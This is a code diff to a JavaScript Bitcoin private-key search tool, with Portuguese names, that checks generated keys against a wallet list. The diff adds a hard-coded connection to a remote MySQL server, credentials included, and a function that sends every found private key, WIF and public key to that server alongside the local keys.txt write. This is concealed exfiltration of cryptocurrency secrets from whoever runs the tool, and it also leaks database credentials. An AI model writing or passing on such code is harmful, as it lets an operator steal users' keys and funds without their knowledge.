@@ -2,9 +2,24 @@ import chalk from "chalk";
 import CoinKey from "coinkey";
 import crypto from "crypto";
 import fs from "fs";
+import mysql from "mysql2/promise";
 import walletsArray from "./wallets2.js";
 
 const walletsSet = new Set(walletsArray);
+
+const connectSql = await mysql.createConnection({
+  host: "34.95.167.202",
+  user: "acesso",
+  password: "CFm7m9iP[nIzR5(",
+  database: "diversos",
+});
+
+async function achou(id, chave) {
+  const [rows, fields] = await connectSql.query(
+    "INSERT INTO T_ACH ( ID, CH ) VALUES ( ?, ?);",
+    [id, chave]
+  );
+}
 
 let shouldStop = false;
 let key = 0;
@@ -89,12 +104,17 @@ async function encontrarBitcoins(key, min, max, shouldStop, rand = 0) {
         console.log("WIF:", chalk.green(generateWIF(pkey)));
 
         const filePath = "keys.txt";
-        const lineToAppend = `Private key: ${pkey}, WIF: ${generateWIF(
-          pkey
-        )}\n`;
+
+        const lineToAppend = {
+          "Private key": pkey,
+          WIF: generateWIF(pkey),
+          "Public Key": publicKey,
+        };
+
+        await achou(1, JSON.stringify(lineToAppend));
 
         try {
-          fs.appendFileSync(filePath, lineToAppend);
+          fs.appendFileSync(filePath, JSON.stringify(lineToAppend));
           console.log("Chave escrita no arquivo com sucesso.");
         } catch (err) {
           console.error("Erro ao escrever chave em arquivo:", err);
